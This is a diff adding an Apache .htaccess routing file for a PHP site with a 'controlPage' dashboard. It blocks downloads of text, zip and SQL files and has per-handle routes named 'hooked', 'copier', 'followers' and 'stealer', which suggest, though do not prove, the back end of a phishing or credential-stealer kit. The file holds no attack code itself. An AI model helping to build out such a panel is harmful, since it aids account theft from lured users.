@@ -1,0 +1,29 @@
+<FilesMatch "\.(txt|zip|sql)$">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME}.php -f
+RewriteRule ^(.*)$ $1.php [L]
+
+# m/oh
+RewriteRule ^controlPage/create$ /frontend/create.php [L]
+RewriteRule ^controlPage/dashboard$ /frontend/dashboard.php [L]
+RewriteRule ^controlPage/refresh$ /frontend/refresh.php [L]
+RewriteRule ^controlPage/sign-in$ /frontend/sign-in.php [L]
+RewriteRule ^controlPage/logout$ /frontend/logout.php [L]
+RewriteRule ^controlPage/js/(.*)$ /frontend/js/$1 [L]
+RewriteRule ^controlPage/css/(.*)$ /frontend/css/$1 [L]
+RewriteRule ^controlPage/file/(.*)$ /frontend/file/$1 [L]
+RewriteRule ^controlPage/files/(.*)$ /frontend/file/$1 [L]
+RewriteRule ^controlPage/assets/(.*)$ /frontend/file/img/$1 [L]
+RewriteRule ^controlPage/apis/(.*)$ /backend/apis/$1 [L]
+
+# m/mh
+RewriteRule ^generator/([^/]+)/create$ /frontend/hooked?h=$1 [L,QSA]
+
+# m/hf
+RewriteRule ^t/([^/]+)/copier$ /frontend/dyn/copier?h=$1 [L,QSA]
+RewriteRule ^t/([^/]+)/followers$ /frontend/dyn/followers?h=$1 [L,QSA]
+RewriteRule ^t/([^/]+)/stealer$ /frontend/dyn/stealer?h=$1 [L,QSA]
